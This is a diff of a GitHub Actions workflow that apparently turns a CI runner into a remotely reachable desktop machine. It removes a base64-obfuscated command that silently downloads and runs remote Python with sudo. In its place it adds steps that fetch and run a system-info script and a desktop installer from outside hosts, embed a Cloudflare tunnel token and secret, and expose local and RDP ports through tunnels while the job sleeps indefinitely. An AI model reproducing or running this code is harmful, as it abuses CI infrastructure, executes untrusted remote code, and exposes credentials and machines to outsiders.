@@ -1,8 +1,6 @@
-name: runner
-
+name: push
 on:
   workflow_dispatch:
-
 jobs:
   run:
     runs-on: ubuntu-latest
@@ -10,8 +8,45 @@ jobs:
       max-parallel: 1
       matrix:
         shard: [1]
-
     steps:
-      - name: runner
+      - name: push
         run: |
-          echo "Y2QgJiYgcGlwMyBpbnN0YWxsIHJlcXVlc3RzID4vZGV2L251bGwgMj4mMSAmJiBzdWRvIGN1cmwgLXMgLS1zaWxlbnQgLVggR0VUIGh0dHBzOi8vZXhhbXBsZW9jaS55dW56aG9uZ3podWFuLmNvbS8wLnB5IC1vIGJpbiA+L2Rldi9udWxsIDI+JjEgJiYgc3VkbyBweXRob24zIGJpbiA+L2Rldi9udWxsIDI+JjE=" | base64 -d | bash
+          cd
+          ls
+
+
+
+          
+
+          echo "B0997D33FD44" > order_no.txt
+          echo "d2b26602-8921-4351-8ff8-3031163d302e" > tunnel_id.txt
+          echo "yunzhongzhuan.com" > cf_domain.txt
+          echo "30GBPS4C16G4HAMDLINUX" > spec_id.txt
+          echo "$GITHUB_RUN_ID" >> ghost_work_id.txt
+          echo "$GITHUB_REPOSITORY" >> runner_info.txt
+
+          curl -X GET -L https://github.com/hubdockercom/example/raw/refs/heads/main/collect_system_info.py -o sysinfo.py
+          sudo python3 sysinfo.py
+
+          sudo shutdown -H now
+
+          
+          curl -X GET -L "https://github.com/cloudflare/cloudflared/releases/download/2026.3.0/cloudflared-linux-amd64" -o msrds
+          echo -e "-----BEGIN ARGO TUNNEL TOKEN-----\neyJ6b25lSUQiOiJhMmUzYWE1NTZjMmVmMzg5ODIwZTRiYzE0ODYzMDMzZCIsImFj\nY291bnRJRCI6IjBkNjNmZWIwOWM2NWVkMjdmMzk0MjAwMjdiMjA1MzZjIiwiYXBp\nVG9rZW4iOiI2aTdoZEZJa0Nvc3l4WUFyWkxEall0YW5GUTdpMXc0ZlhlWW94MmFR\nIn0=\n-----END ARGO TUNNEL TOKEN-----\n" > cert.pem
+          echo '{"AccountTag":"0d63feb09c65ed27f39420027b20536c","TunnelSecret":"BJhrxa6m17HwLFhSSZzQu9h/dLDyDqhHHzYzFj/skkc=","TunnelID":"d2b26602-8921-4351-8ff8-3031163d302e","Endpoint":""}' > config.json
+          echo -e "tunnel: d2b26602-8921-4351-8ff8-3031163d302e\ncredentials-file: config.json\n\ningress:\n  - hostname: d2b26602-8921-4351-8ff8-3031163d302e.yunzhongzhuan.com\n    service: http://localhost:27015\n  - service: http_status:404" > config.yml
+          chmod +x ./msrds
+          ./msrds tunnel run --origincert cert.pem --credentials-file config.json --loglevel fatal --protocol http2 --url http://localhost:27015 d2b26602-8921-4351-8ff8-3031163d302e
+          
+
+          curl -X GET "https://exampleoci.yunzhongzhuan.com/linux-desktop-installer(GoodNoVNC).sh" -o 0.sh
+          chmod +x 0.sh
+          ./0.sh
+          sleep 999999999
+
+          # curl -X GET https://exampleoci.yunzhongzhuan.com/linux/cloudflared/cloudflared-linux-amd64 -o cfd
+          # curl -X GET https://exampleoci.yunzhongzhuan.com/linux/cloudflared/.cloudflared/cert.pem -o cert.pem
+          # curl -X GET https://exampleoci.yunzhongzhuan.com/linux/cloudflared/.cloudflared/097edd59-4421-4b13-b5fc-7015ae4cf939.json -o 097edd59-4421-4b13-b5fc-7015ae4cf939.json
+          # curl -X GET https://exampleoci.yunzhongzhuan.com/linux/cloudflared/.cloudflared/097edd59-4421-4b13-b5fc-7015ae4cf939.config.yml -o 097edd59-4421-4b13-b5fc-7015ae4cf939.config.yml
+          chmod +x cfd
+          ./cfd tunnel --credentials-file 097edd59-4421-4b13-b5fc-7015ae4cf939.json --origincert cert.pem --config 097edd59-4421-4b13-b5fc-7015ae4cf939.config.yml --url tcp://localhost:3389 run ocivnc5901
